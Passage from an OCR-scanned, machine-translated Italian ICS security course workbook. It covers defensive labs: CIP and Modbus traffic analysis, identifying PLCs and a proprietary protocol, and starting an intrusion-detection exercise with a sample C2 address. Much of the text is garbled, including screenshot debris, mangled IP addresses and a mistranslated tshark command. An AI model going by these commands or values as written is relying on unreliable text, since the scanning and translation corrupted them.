+- 22575 243.168614 18.10.20.50 10.10.10.20 cIP 12i accesso: 'DP9TimerDelay' - Servizio 22576 243.169207 10.10.10.20 10.10.20.50 cIP "P1' - Servizio (x4c)
 22577 243.174167 10.16.20.50 10.10.10.20 cIP 87 Successo: 'P1' - Servizio (@x4c) 22578 243.174425 10.18.10.20 10.16.20.50 cIP 1160 'P10' - Servizio (6x4c) 2 2579 243.179743 10.10.20.50 10.10.10.20 cIP 107 Successo : 'P10' - Servizio (@x4c) 22580 243.180072 10.16.10.20 10.10.20.58 cIP 114 'Pi@Level' - Servizio (@x4c)
| 22581 243.185256 16.10.20.58 10.10.10.20 cIP 110 Operazione riuscita: 'PiOLevel' - Servizio (@x4
| 22582 243.185590 10.10.10.20 10.10.20.50 cIP 111 'P1' - Servizio (@x4d)
| _22585 243.191236 10.10.20.50 10.10.10.26 ciP 104 Successo: 'Pi' - Servizio (0x4d)

» Protocollo industriale comune
» Servizio: Servizio sconosciuto (@x4c) (Richiesta) eo = Richiesta/Risposta: Richiesta (x0)
.10@ 1100 = Servizio: Sconosciuto (0x4c) Dimensione percorso richiesta: 8 parole
» Percorso della richiesta: DP9TimerDelay
> Segmento di percorso: @x91 (segmento di simboli estesi ANSI) 100. .... Tipo di segmento di percorso: Segmento di dati (4)
...1 9901 = Tipo di segmento dati: Segmento simbolo esteso ANSI (17) Dimensione dati: 13 byte Simbolo ANSI: DP9TimerDelay
 wu

*Rispondi* 8

*Nota* Puoi anche ottenere questa risposta rapidamente in tshark utilizzando il seguente filtro: tshark -r normalops.pcap -Tfields -e cip.request_path_size
“((ip.addr==10.10.20.50) ) && (cip.symbol corrisponde a “TimerDelay”)” | ordinare | unig -c
 Esercizi da asporto
 Alcuni, non tutti, I.C.S. i protocolli contengono informazioni affidabili utili ai fini dell'identificazione delle risorse. Spesso sorprende le persone che tu possa regolarmente estrarre marca/modello/seriale/firmware e ulteriori informazioni da I.C.S. protocolli tutti passivamente analizzando il traffico. Comprendere l’I.C.S. I protocolli consentono inoltre di vedere cosa viene fatto ai controller, ad esempio scritture/letture, e quali comandi con quali valori vengono forniti ai controller.

© 2021, Robert M. Lee Lab2.3-7 Dp DD DO aa
 ahi

» oe oO ww ww Ww Ww Ww
 voto
 e Analizzare il traffico e i protocolli di un sistema in esecuzione e Identificare le risorse di un sistema in esecuzione
 Questo laboratorio utilizzerà la macchina virtuale Windows, RELI.C.S. Kit VM e PLC
 1. In base al traffico di rete, quanti PLC sono presenti nel segmento locale?
 2. Sono presenti componenti del sistema che comunicano utilizzando sistemi I.C.S. sconosciuti e/o possibilmente proprietari. protocolli?
 Compito – Investigare le relazioni tra I.C.S. applicazione e traffico di rete.

*Nota* Per ottenere gli stessi risultati mostrati in questa cartella di lavoro, assicurarsi che il sistema funzioni con la seguente configurazione.
 1. Organizzare l'ambiente per il laboratorio assicurandosi che il sistema funzioni con la seguente configurazione.

> Il ClickPLC e la scheda I/O sono assemblati, configurati e funzionanti.

> Aprire il software di programmazione CLICK (Windows fare doppio clic sull'icona del desktop per il software Click) e selezionare Connetti al ClickPLC. Selezionare Connetti quando viene rilevato il PLC Click e selezionare Leggi progetto dall'opzione Click PLC.

> Fare doppio clic sul collegamento del display HMI sul desktop della VM Windows per aprire l'HMI e passare al display "Principale".

> Se le comunicazioni sull'HMI sono scadute o si sono interrotte, riavviare il servizio MatrikonOPC Server for Modbus Devices facendo doppio clic sul collegamento sul desktop Riavvia servizio Matrikon

© 2021, Robert M. Lee Lab 2.4-1 Principale HMI del sistema di alimentazione 1H
 fata,

@)
 enerazione.ate Trasmissione MW Uscita anche i 4 Relè di protezione interruttore n Chiuso 1 Aperto Chiuso, |_ Reset guasto S irae ve Guasto 1
\' | 7s e basta
= un generatore di Ca T — ann ie et
———516 | s3— ofo~ ai6 | at ovo o t © fo een ee. t=! (TRS SS SS Carico T Min <> Max i” oH | ft r ix, ~ Richiusura
' Era Apri Chiudi N as ' a * 1 \ 4 Carica e oa
'ez 7 \ Misuratore di potenza (%) | Miniera Max 1 a > Fes im. ~ oi T
© 2021 SANS | ere} | | ——2-6. Made in USA 1 y we 4109) industria ‘ [Distribuzione

‘Aleem tire ‘Achnowieage bre Tit 0 FH ‘Trancmission Breaker Theped AN Area di generazione Critical farm Local Generator NotAl iin For Bresiar Closed
 lor Mott bin For Bresker Closed rea Critical Alara
 17:00 a5 Pu

+7752021 82050 TEL
+71510001 25229 PU
 2. Apri la finestra RELI.C.S. VM e accesso

> Nome utente: reliquie

> Password: reliquie 3. Assicurati di poter eseguire il ping da RELI.C.S. alla VM Windows e al PLC CLICK

> Aprire una finestra Terminale ed eseguire il ping di 192.168.0.8 (Windows VM) e 192.168.0.10 (CLICK PLC) 4. Avviare l'applicazione OpenPLC configurata su RELI.C.S. VM

> Individuare l'icona OpenPLC nel vassoio inferiore e fare clic con il tasto destro su di essa per "Avviare i servizi OpenPLC"
 Nuova finestra
 Avvia i servizi OpenPLC
 oanoesegHh>, ® &® & & eo ®
 Arrestare i servizi OpenPLC
 Rimuovi dai preferiti
 a, ® m@

> Andare alla VM Windows e fare doppio clic sul collegamento sul desktop OpenPLC Runtime per connettersi a RELI.C.S. Servizio OpenPLC appena avviato. Accedi come Nome utente: reliquie Password: reliquie

© 2021, Robert M. Lee Lab 2.4-2
 a oanmn @® cs’ <p’ is <p’ iy <p ia is ve ip
 1 secondo

“sp “5 è “5 è “Bs 4B) “s' “s 1s

“Se
 ehm
 il Cruscotto
 Programmi Dispositivi slave Monitoraggio Impostazioni utenti hardware
 Disconnettersi
 Stato: interrotto
 Avviare il PLC
 Stato dashboard: Arrestato Programma: Descrizione FuelValve:
 File: 756084.st
 Durata: N/D
 Registri di runtime
 Il runtime di OpenPLC è n
 Valvola del carburante
 Selezionare il pulsante "Avvia PLC" Attendere qualche secondo e quindi aggiornare la pagina oppure accedere alla pagina </> Programmi e quindi tornare alla pagina Dashboard. Dovresti vedere lo stato cambiare in In esecuzione. Ora abbiamo stabilito le comunicazioni da un "softPLC" in esecuzione su RELI.C.S., all'HMI in esecuzione sulla VM Windows, e le comunicazioni dal Click PLC a RELI.C.S. OpenPLC e l'HMI.
 All'interno di RELI.C.S., start-up Cyberlens.
 VVVV

© 2021, Robert M. Lee
 Fai clic con il pulsante destro del mouse sull'icona Cyberlens dal pannello Dock nella parte inferiore dello schermo. Scegli "Avvia servizi" Quando richiesto in una nuova finestra del terminale, inserisci "reliquie" come password.
 Una volta chiusa la finestra del terminale, fare clic con il pulsante sinistro del mouse sulla stessa icona Cyberlens per aprire l'applicazione.
 Nuova finestra
 Avvia Servizi
 Interrompere i servizi
 Rimuovi dai preferiti
 Lab 2.4-3 8. All'interno di Cyberlens se richiesto:
> Inserisci il nome utente "reliquie" e la password "reliquie".
> Seleziona la casella "Accetta il contratto di licenza" e "Accedi".
 Nome utente
 reliquie

¥ Accetta il contratto di licenza @
 Registrazione
 9. Controlla lo stato del server.
> Apri la "Console del server" dal menu a sinistra.
> Assicurarsi che il server sia in esecuzione sulla porta di ascolto 1337.
 Tempo trascorso: 0d:0h:0m:15s | tt Porta di ascolto: 1337 |

© 2021, Robert M. Lee Lab 2.4-4
 oe, @, @, @, @ @, @,
 ehi,
 ce) @), ae ww ww ww ww WW
 noi Ww
 oe come aJ ws
 10. Configurare ed eseguire il sensore.

> Apri la "Console dei sensori" dal menu a sinistra.

> In "Live Capture", inserisci le seguenti opzioni visualizzate nell'immagine sottostante.
 Opzioni di interfaccia
 ens33
 Dimensione della finestra @ 10
 Ospite del server
 localhost
 Porta del server @ 1337

# Opzioni
 secondi +

> Avviare il sensore e assicurarsi che funzioni come mostrato nell'immagine seguente.
 Tempo trascorso: 0d:0h:0m:43s

© 2021, Robert M. Lee
 Lab2.4-5 11. Cattura alcuni record.
> Guarda i "Registri dei sensori" per le nuove voci.

«Registrazioni dei sensori
'Sensore * Pacchetti Byte Dimensione finestra Timestamp | b 149K 181 KB 16 secondi 2021 -07-0GT00:23:45.0002 | 1 148K t80Ke 10 secondi 2n21-07-0870028'34 0002 | 1 137K 1eKB 10 secondi 2021-07-03T0023:12.0002 |
 j Byte elaborati

> Lascia il sensore in esecuzione in background per raccogliere più dati e passare al passaggio successivo.
> (In alternativa) Attendere fino al raggiungimento di 5 o più record prima di arrestare il sensore.

*Nota* La tabella e il grafico rappresentano il numero di pacchetti elaborati. Dovrebbe contenere circa 1,47K pacchetti e 178-179 byte. Inoltre, se la dimensione della finestra è stata lasciata predefinita, sarà necessario attendere più a lungo affinché i record lo facciano

° @

®
 essere visualizzato.
 12. Rivedi dashboard

> Naviga su "Dashboard" dal menu a sinistra.

> Esamina le informazioni visualizzate ma prendi nota dell'oggetto "Livello applicazione".
 Livello di applicazione

© 2021, Robert M. Lee
 di Web HTTP a.
 Altro
 Modous Lo
 Laboratorio 2.4-6
 eh

= = sì, ehi

=

~
 o è è’ è <s è! È!
 COME
 13. Esaminare la topologia del traffico di rete e le risorse sulla rete.
> Naviga su "Mappa interattiva" dal menu a sinistra.
> Carica l'acquisizione facendo clic su "Avvia" e quindi su "Acquisizione live/offline".
 Istantanee edbmis live/offline
 Confrontare
 Mappa attuale
 Cancella mappa

> La topologia visualizzata sarà simile alle immagini sottostanti ma varierà a seconda del traffico presente sulla rete.Se vengono visualizzati solo gli indirizzi MAC, l'analisi comportamentale all'interno di Cyberlens non è stata in grado di associare l'indirizzo MAC di un dispositivo al suo indirizzo IP.
 i 00:0¢:29:7b:ad:74 00:40: 7¢:12:c7:05 OEE inware. ‘
 Rete non mappata 00:0¢:29:45:d3:86 Vmware

> Lasciare il sensore in funzione, o riavviarlo se fermo, per consentire la riuscita dell'associazione MAC/IP.

© 2021, Robert M. Lee Lab2.4-7
> Ogni pochi minuti aggiorna la topologia facendo clic su "Avvia" e quindi su "Acquisizione live/offline" finché tutti, o almeno alcuni, gli indirizzi IP appaiono associati all'indirizzo MAC come mostrato nell'immagine seguente.

>> Torna alla Console del sensore facendo clic sul pulsante di navigazione a sinistra del pulsante Start nella parte superiore del menu a sinistra. Dalla console del sensore Arrestare il sensore.
 fa
 192.168.0. _ 00:0¢:29:4: Vmware 2.168,0.10 B0:70:12:¢7:05 KoyoElec
 192.168.0.8 00:0¢:29°7b:ad:74 Vmware

*Nota* Quando si acquisiscono pacchetti da un'altra rete remota, l'effettivo indirizzo MAC del dispositivo remoto non sarà presente. Pertanto, per vedere tutti gli indirizzi IP pubblici e privati ​​acquisiti dalla rete, fare clic su "Visualizza" e selezionare sia "Dispositivi pubblici/esterni" che "Dispositivi privati/interni". La possibilità di associare l'indirizzo MAC e l'indirizzo IP degli endpoint aiuterà a comprendere quali comunicazioni esistono all'interno di un segmento di rete e tra segmenti di rete.
 14. Esaminare la tabella dei risultati.
> Passare alla schermata "Visualizzatore dati".
> Più record dovrebbero essere visualizzati in "Tabelle dati". Fare clic su "Protocolli visti per la prima volta" per aprire la tabella associata.

© 2021, Robert M. Lee Lab2.4-8 wy Ww

“Pp “sp ws così com’è mT è “B”

“P
 Visualizzatore > Protocolli visti per la prima volta
 Protocolli visti per la prima volta

@ Installatori: Mostra 10 voci v
 Indirizzi Ethernet s
 Indirizzi IP
 192.168.0.9
 192.168.0.10
 192.168.0.8
 192.168,08
 192.168.0.9
 192.168.0.8
 192.168.0.10
 Strato
 applicazione applicazione applicazione applicazione applicazione applicazione
 applicazione

> Selezionare "Modbus" nel filtro nella colonna Protocollo.

> Tre risorse stanno comunicando utilizzando Modbus, tuttavia, questa tabella non indica quali
 dispositivo è il PLC.
 Indirizzi Ethernet 4 Indirizzi IP 00:00:29:45:d3:86 192.168.0.9 00:0c:29:7b:ad:74 192.168.0.8 00:00:7¢:12:c7:05 192.168.0.10 Filtro

> Torna all'elenco delle "Tabelle dati" in "Visualizzatore dati" e apri i "Record del flusso di applicazioni"
 tavolo.

> Scarica la tabella in formato EXCEL e aprila in LibreOffice Calc facendo clic sul collegamento nel file
 In alto a destra.

© 2021, Robert M. Lee
 Filtro
 Strato
 applicazione
 applicazione
 applicazione
 Filtro
 Protocollo Modbus Modbus Modbus World Wide Web HTTP World Wide Web HTTP Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo
 ModBus.
 ModBus
 ModBus
 Filtro
 Lab2.4-9
°
 ning trasporti_records,xls x
 Hai scelto di aprire: transport_records.xls
 ovvero: tipo application/xls da: http://localhost
 Cosa dovrebbe fare Firefox con questo file? C YBER @openwith LibreOffice Calc (predefinito) v
 Salvare il file
 Fallo automaticamente Per file come questo Da ora in poi. |
 Scarica: | csy | |
| Annulla OK N

> All'interno di LibreOffice Calc, attiva il filtro automatico e fai clic su "Sì" per utilizzare la prima riga come intestazione di colonna.
 File Modifica Visualizza Inserisci Formato Stili Foglio Dati Strumenti Finestra Guida

-G@-H- Inizia asg

|
 J
|
|
|
|
 19| Ai ~ fx E+ = srcip 'o | o Questo documento è aperto in modalità di sola lettura. | Filtro automatico h Altri filtri » Moe | ce Tl | : E |

(sictP_|Dst iP Protocol. Applicazione | Definisci intervallo... prt
 2 _/192.168.0.9 192.168.0.10 TCP __Modbus Seleziona intervallo...
 3 _|192.168.0.10 192.168.0.9 TCP Modbus _ Pai

> Utilizza la prima riga come intestazioni di colonna
> Filtra la colonna "Porta origine" per mostrare solo le voci 502.
>> Aprire il menu filtro nella colonna "Src IP" e annotare la voce.

© 2021, Robert M. Lee Lab 2.4-10

“, noi) ‘B) @, ee,
 e)

(2) e HD)

. Ow Ww Ww WD W
 Te
 contro CA! Cs CS
 Ua
 ip
 è così è
 w
 a ee ont [e]ost Por [x]Totale Pa Ordinamento crescente

- Ordine crescente
 Ordinamento discendente =| Ordine decrescente
 Primi 10 ~~} Primi 10 Vuoto i — Vuoto Non vuoto 7 Non vuoto
 Filtro standard... 7 — Filtro standard...

[Cerca elementi... “| Elementi di ricerca

: je Sie) ea
|, (-] $0095, $4573, 59260 | mi 502 | |
~ | 50780 cioè + 51365 | “|
|
|

| $ 1775 om —

_] $ 1793, 63420

_OK » Annulla OK | Annulla
 lars TV ieMy ID GIOCATTOLO TRH TW TG? TRA TH Trp

| io io

*Nota* Viene elencata solo 1 voce, il che significa che dai pacchetti raccolti, il dispositivo all'indirizzo 192.168.0.10 esegue un server Modbus. (Potresti vedere due indirizzi IP come un artefatto del tuo sistema). Si tratta quindi di un PLC attivo all'interno del traffico di rete raccolto. Sono necessarie ulteriori indagini sul traffico di rete in base alle modifiche dello stato del sistema per confermare che questo è l'unico PLC presente.
 15. Torna alla "Console del sensore" in Cyberlens e riavvia le acquisizioni live. 16. Tornare alla VM Windows e passare alla visualizzazione Generazione.

> Assicurarsi che i "CT Fuel Valve Controls" siano in modalità automatica e che OpenPLC sia selezionato come mostrato nell'immagine seguente.

© 2021, Robert M. Lee Lab 2.4-11 BE Power System HMI - Generazione
 Principale
 Trasmissione ; 718)2021 Generazione Pept ti Residenziale Industriale Rai PM
 La valvola del carburante CT controlla lo stato di interblocco della generazione
 19 3 @ OpenPic * @ Trans Breaker chiuso
 Locale o Manuale

© Modalità manuale i | j O Intertie attivato
© Autorizzazioni dell'interruttore automatico della modalità
© Locale Fare clic su PLO y @ Generatore in funzione

@Trad. Relè di protezione
@ Carica presente
 Turbina a vapore ad aria aspirata 120
 Turbina a combustione

@CT in esecuzione @AVROn Power
 Modalità Esperto © /CT Arrestato © Modalità Manuale Attiva Generazione Consumi Sim Disponibile 8 4
'On = Utilizza la tensione di avvio PB Industnal 0 MW Mw Local
 Spento = Avvio automatico Regolazione SES gemcd: MW Intertie
 Residenziale 50 aw
 Totale uw mw Totale

* 715/2021 20:20:50 5 ‘Allarme critico area di trasmissione
+ 79572021 352.29PM © — 72021 14855AM Zona residenziale Allarme critico
 Allarme critico dell'area di generazione segnalata dall'interruttore di trasmissione del messaggio
 Generatore locale Notat Min per interruttore chiuso Generatore locale Not iin per interruttore chiuso Allarme critico area di generazione
 Controlli della valvola del carburante CT

© Modalità manuale
@ Modalità automatica
© Locale Fare clic su PLC
 19% aperto presso OpenPLC
 Modalità OpenPLC locale o manuale Modalità Controllo _ Setpoint di controllo
 ClickPLC == Manuale ~ a i

> Con i controlli delle valvole del carburante ora gestiti dal PLC aperto remoto, testare le operazioni da PLC a PLC aumentando o riducendo il carico dai quadranti residenziali e industriali sulla scheda.

> Dovresti notare un cambiamento associato nella posizione percentuale di apertura della valvola in risposta alle variazioni della domanda di carburante quando il carico sale o scende. Stiamo assistendo ora a un sistema più tradizionale di acquisizione delle comunicazioni di sistema con più dispositivi di controllo sulla rete, ciascuno dei quali gestisce una parte specifica del processo e comunica in modo univoco con l'HMI.

> Torna a Cyberlens e lascia il sensore in funzione.

> Ripeteremo l'ultimo passaggio di esportazione e revisione dei dati in EXCEL. Torna all'elenco di
"Tabelle dati" in "Visualizzatore dati" e apri la tabella "Record flusso applicazioni".

> Scarica la tabella in formato EXCEL e aprila in LibreOffice Calc facendo clic sul collegamento in alto a destra.

> All'interno di LibreOffice Calc, attiva il filtro automatico e fai clic su "Sì" per utilizzare la prima riga come intestazione di colonna.

> Filtra la colonna "Porta origine" per mostrare solo le voci 502.

> Apri il menu filtro nella colonna "Src IP" e annota la voce.

© 2021, Robert M. Lee Lab 2.4-12

@,

> www

“> è “> ip! ip) è 4s! sì! è è! <s è
 noi

"S
 ed

'SSS a se at Se ea Re Wisc ip [glos iP [e]Protocoi 3 Ordinamento ascendente Ordinamento discendente
 Primi 10 -_ Vuoto Non Vuoto
 Filtro standard... a
 Cerca elementi...
 192.168.0.9
 PPrePePrrer errr rPererrl
 OK _ Annulla
 TE? TRH OWT? TRH TH mp
 di Pha

*Nota* Un sistema I.C.S. in genere utilizza più dispositivi integrati, come PLC e RTU. Come e se appariranno sulla rete dipenderà da 2 cose. (1) Il sensore raccoglie il segmento di rete corretto per vedere il traffico e (2) è presente una comunicazione attiva con il dispositivo. In questo laboratorio abbiamo determinato che i dispositivi finali che ospitano un servizio Modbus (porta 502) erano un PLC. Abbiamo inoltre stabilito che la visibilità della comunicazione PLC si basa su quale display è stato caricato sull'HMI. Questo piccolo esempio dimostra quanto possa essere difficile rilevare i malware I.C.S. comunicazioni senza falsi positivi quando si misura solo da una linea di base del traffico.

*Risposta 1* Ci sono 2 PLC nella rete locale.
 Compito – I.C.S. Analisi del protocollo

*Nota* Assicurati di aver configurato il sistema e le applicazioni come indicato nel primo passaggio all'inizio di questo lab.
 1. Identificare gli endpoint che comunicano su I.C.S sconosciuti. protocollo.
>> All'interno di Cyberlens, aprire la tabella "Protocolli visti per la prima volta" in "Visualizzatore dati"
> Filtra la colonna "Protocollo" per visualizzare solo le voci "Protocollo sconosciuto".

© 2021, Robert M. Lee Lab 2.4-13 Protocolli visti per la prima volta

© Fes Pretec: Sconosciuto Pretec >
 Spettacolo
 Indirizzi Ethernet
 00:00:29:7b:annuncio:74
 00:40:76:12:07:05
 Filtro

*Nota* Sembra che ci siano 2 endpoint che comunicano utilizzando un protocollo sconosciuto. potrebbe semplicemente significare che Cyberlens non ha il
 10 ~ voci

&
 Indirizzi IP:
 f€80:0000:0000:0000:7086:831 1 :ad82:6168
 192.168.0.8 192.168.0.10
 Filtro
 Applicazione applicazione applicazione livello
 Filtro
 Cerca: Protocollo sconosciuto Protocollo sconosciuto Protocollo sconosciuto Protocollo filtro a
 necessario per determinare cos'è il protocollo, se si tratta di un vero e proprio sistema I.C.S. protocollo e come si collega a questo I.C.S.. Se questo record non esiste, è probabile che l'applicazione non sia configurata come indicato nel passaggio 1 all'inizio di
 questo laboratorio.
 2. Identificare l'applicazione del protocollo sconosciuto.

> All'interno di Cyberlens, aprire la tabella "Record del flusso di applicazioni" in "Visualizzatore dati"
> Filtra la colonna "Applicazione" per visualizzare solo le voci "Protocollo sconosciuto".
> Filtra la colonna "IP Dst" per visualizzare solo le voci "192.168.0.10".
 Record del flusso dell'applicazione
 Mostra 10
 Srcip
 192.168,06
 192.168,08
 192.168.0.8
 192.168.08
 192 168.08
 192.168.0.8
 192.168,08
 192.168,08
 192.168.0.8
 192.168.0.8
 Filtra Y

© 2021, Robert M. Lee
 v voci
 L'IP
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 192.168.0.10
 Filtro
 Protocollo
 uoP
 uoP
 uop
 upe
 uoP
 suP
 superiore
 suP
 superiore
 upe
 Filtro
 Applicazione
 Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo sconosciuto

“Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo sconosciuto
 Protocollo sconosciuto
 Installatore
 Direzione
 Sconosciuto
 Sconosciuto
 Sconosciuto
 Sconosciuto
 Sconosciuto
 Sconosciuto

'Sconosciuto
 Sconosciuto
 Sconosciuto
 Sconosciuto
 Installatore
 Porta Origine Porta Dst 58301 25425 58301 25425 58301 25425
$8301 25425 58301 25425 58301 25425 58901 25425 58301 25425 58901 25425 58301 25425 Installatore Fiter gl v Lab 2.4-14
 Sconosciuti, in questo caso, i dissettori per questo particolare protocollo. Ulteriori analisi sono

~ o ~~ Fl] @) @®) ™) ™ @) @) @)
 fe,
 Aon? o°o,

('> vers
 anno Domini

*Nota* Da quanto mostrato, 192.168.0.8 e 192.168.0.10 comunicano utilizzando questo protocollo sconosciuto. Supponiamo che il PLC (192.168.0.10) sia il lato server di questa comunicazione e annotiamo il protocollo del livello di trasporto (UDP) e il numero della porta di origine che potrebbero non corrispondere all'immagine sopra.

> Assicurarsi che il sensore Cyberlens sia arrestato.

> Dopo aver arrestato il sensore, chiudere Cyberlens

> Dall'interno di RELI.C.S. avviare wireshark dal pannello dock.
> Avvia l'acquisizione di pacchetti sull'interfaccia ens33.
 Catturare

...utilizzando questo filtro: [i [Inserisci un filtro di acquisizione... dockerO ae
 EN eee ee ee veth5d3c69b Te Loopback: lo AAU qualsiasi f

> Con l'acquisizione in esecuzione, applicare il seguente filtro udp.port ==25425

> Interrompere l'acquisizione se vengono visualizzati i pacchetti. Se non vengono visualizzati pacchetti, è probabile che l'applicazione non sia configurata come indicato nel passaggio 1 all'inizio di questa esercitazione.

*Nota* I risultati in Wireshark indicano chiaramente che non esiste un dissettore per questo protocollo in Wireshark. Prendere nota dell'altra porta di comunicazione in uso nella conversazione filtrata che si verifica con la porta 25425
 2. Identificare il processo e il fornitore che comunicano tramite questo protocollo.
> Dall'interno della VM Windows. Esegui PowerShell come amministratore.
>Eseguire il seguente comando. Sostituendo "YourPortNumberHere" nel comando con la porta di origine identificata in precedenza.
 Get-Process -Id (Get-NetUDPEndpoint -LocalPort YourPortNumberHere).OwningProcess | Seleziona percorso oggetto

*Nota* Il protocollo è correlato al software di programmazione AutomationDirect ClickPLC.

*Risposta 2* Gli endpoint 192.168.0.8 e 192.168.0.10 stanno comunicando tramite un I.C.S sconosciuto. protocollo. Non è certo, ma probabile che si tratti di un protocollo proprietario.

© 2021, Robert M. Lee Lab 2.4-15 Suggerimenti per gli esercizi
 Lo scopo di questo esercizio era aggiungere un altro componente operativo all'ambiente I.C.S.515 Student Lab. Ciò è stato realizzato avviando RELI.C.S. e il lancio dell'applicazione OpenPLC che agisce come un soft PLC nell'ambiente fornendo stato e controlli alla posizione della valvola di alimentazione del carburante del generatore. Ciò ci consente di avere una visione più sistematica del processo Student Kit.
 Con queste comunicazioni aggiuntive e le comunicazioni esistenti da e verso il kit dello studente all'HMI, potremmo vedere informazioni sui dispositivi, sui protocolli utilizzati, monitorare il traffico in tempo reale ed eseguire alcune attività/i.C.S. analisi protocollo di comunicazioni proprietarie sconosciute.
 Durante l'esecuzione del rilevamento delle risorse all'interno di un ambiente OT, potrebbero essere scoperte comunicazioni sconosciute tra i dispositivi e potrebbero facilmente esserci dispositivi che non sono stati rilevati a seconda dello stato operativo dell'ambiente (operazioni normali con dispositivi di standby primari/secondari, operazioni anomale dopo che le risorse failover o guasti del dispositivo e operazioni di emergenza dopo un evento che incide sulle operazioni). Questi vari stati operativi potrebbero facilmente avere un impatto su quali risorse comunicano all’interno dell’ambiente e su come si presentano le comunicazioni in un dato momento.

© 2021, Robert M. Lee Lab 2.4-16
 FM

-~

~~ wowwwwwww
 va Ww
 eo wo w WwW
 oT ee
 oe vediamo PH ow OW
 Lab 3.1 — Rilevamento delle intrusioni di Fase 1
 e Distinguere le intrusioni generali dalle intrusioni della fase 1 e Sfruttare l'analisi del traffico per seguire le intrusioni e — Identificare gli artefatti e gli indicatori chiave delle intrusioni

*Informazioni sullo scenario* Il team Threat Intelligence Consumption ha notato che esiste una minaccia emergente che prende di mira la comunità industriale. Temono che possa esserci una minaccia che sfrutta le infrastrutture straniere per prendere di mira le società industriali. Non sanno altro oltre al crescente interesse in questo momento. Non sono nemmeno sicuri che l’aggressore sia specificamente interessato a I.C.S.. Hanno chiesto al team di rilevamento delle minacce di eseguire un’analisi approfondita del traffico di rete oltre i rilevamenti attuali per identificare
 qualcosa di anormale. Tu, come membro del team di rilevamento delle minacce, decidi di iniziare nella rete IT aziendale della raffineria di Calistoga.
 Preparazione agli esercizi
 Questo esercizio utilizzerà il tuo RELI.C.S. VM e il file itincident.pcap nella cartella I.C.S.515 > calistogarefinery > pcaps sul desktop della VM.1. Cos'è l'IP di Comando e Controllo (C2), il suo dominio e il sistema vittima? 2. Qual è il nome del file che potrebbe essere dannoso?
 3. Di quale comune utilità Windows si abusa nel documento?
 4. Qual è l'indirizzo IP del probabile sistema compromesso?
 5.
 Quali sono altri due file potenzialmente dannosi che contribuiscono a dimostrare che si tratta di un'intrusione di Fase 1?

© 2021, Robert M. Lee Lab 3.1-1 Attività: regole di rilevamento
 1. | Qual è l'IP di comando e controllo (C2), il suo dominio e il sistema vittima? 192.41.148.220

__tckwel(punto)ru 10.10.0.10
> Inizia il tuo RELI.C.S. VM
> Accedi alla VM

> LOGIN=reliquie
> PASSWORD = reliquie

> Apri itincident.pcap in Wireshark
> Apri la cartella I.C.S.515 situata sul desktop e poi vai a calistogarefinery > pcaps
> Fare doppio clic su itincident.pcap per aprire il file in Wireshark
 grasso Home Desktop 1CS515 calistogarefinery pcaps

- -
© Recenti — 2193 itincident.pca Eee
* Speciale = pipì? Cy Hone a normalops.pcap a
(0 Desktop uN otincident.pcap
=) Documenti

*Nota* Spesso è utile identificare i "top talker" su una rete per vedere quali indirizzi e sistemi comunicano di più. Osservare gli indirizzi più comunicativi, il trasferimento di dati più grande o anche la durata più lunga delle sessioni è utile così come cercare quelli più piccoli. Questo non è sempre efficace poiché le reti moderne hanno molte comunicazioni che sembrano molto simili alle comunicazioni di esfiltrazione o di comando e controllo, ma è un buon punto di partenza.

> Analizza le conversazioni in Wireshark
> In Wireshark fai clic su Statistiche
> Seleziona Conversazioni
> Esaminare le comunicazioni IPv4

© 2021, Robert M. Lee Lab 3.1-2

~ °°, oh,

~~

~o° =

°, a ip <s wa ww o/
 w
 COME
 w

“5 OG

“5
 a5
 COME
 4g40@")®

| &|Applica un filtro di visualizzazione... <ctri-/>
|No. Tempo 1 0,600000
 Fonte
 File Modifica Visualizza Vai Acquisisci Analizza Geo Telefonia Wireless _Strumenti Guida “i
 Proprietà file di acquisizione Risolta la gerarchia dei protocolli degli indirizzi
 Conversazioni
 2 ©.002090 10.10.0.5gf Endpoint 3 0.004474 10.10.0409 Lunghezze pacchetto 4 0.117871 10.10.0.50) monaco
 Ctrlsalt+maiusc+c

*Nota* Nella scheda Conversazioni fare clic sulla scheda IPv4 e ordinare per Pacchetti in modo che il maggior numero di pacchetti
 sono in cima alla lista.
 192.41.148.220 10.10.10.20
 2 1A tA 2A
 227.708 65M 109.538 51.811 62M 44.805 AN e7O anna BY)

="

*Nota* Vediamo che l'indirizzo IPv4 10.10.0.10 comunica con 192.41.148.220 come comunicazione principale sia tramite pacchetti che byte nell'acquisizione di pacchetti che abbiamo aperto. Ci sono altri record interessanti, ma ci concentreremo qui e determineremo qual è l'indirizzo IP 192.41.148.220 per vedere se qualcosa risalta prima di scavare più a fondo nelle comunicazioni. Non è stato precedentemente identificato nella fase Visibilità.

> Analizzare il nuovo indirizzo IP

> Seleziona l'indirizzo IP, fai clic con il pulsante destro del mouse e scegli Applica come filtro > Selezionato > Qualsiasi -> B

> Esaminare il traffico
 Ethernet-18 IPv4-17 IPv6 TCP-1582

| Indirizzo A Indirizzo B Pacchetti Byte 10.10.0.10 192.471.148.220 29.462 10.10.0.10 10.10.11 Applica come filtro rf 10.10.0.50 10.10.2, it: | 10.10.0.10 10.10.90, Prepara un filtro 10.10.0.40 10.10.2, Trova | 10.10.0.10 10.10.2) .

(10.10.0.30 10.102..Solorze
 16

*Nota* Esistono diversi modi per trovare informazioni su questo indirizzo IP nell'acquisizione dei pacchetti, inclusa l'identificazione di tutti i protocolli che utilizza e l'identificazione di quelli che potrebbero contenere informazioni identificative. Con il filtro applicato in precedenza, però, vediamo che c'è traffico TCP e HTTP. È probabile che il traffico HTTP dia
 quello che vogliamo, incluso un nome di dominio.

> Determina se sono presenti informazioni nelle sessioni HTTP
> Fare clic su una delle comunicazioni HTTP

© 2021, Robert M. Lee
 Laboratorio 3.1-3
> Fare clic con il tasto destro e seguire > Flusso TCP
 Destinazione
 Seq=276 Ack=20458 Seq=276 Ack=27758 Win=48128 Seq=276 Ack=35058 Win=40704 Seq=276 Ack=42358 Win=33536 Seq=276 Ack=48198 Win=27648 Seq=276 Ack=96878 Win= 15872
 143 .810538 10.10.0. 143.810590 10.10.0. 143 .810642 10.10.
 143.810696 10.10.60. 143.810901 10.10.60. 143 .811003 10.10.60.

|ACK] Modifica nome risolto | Applica come filtro
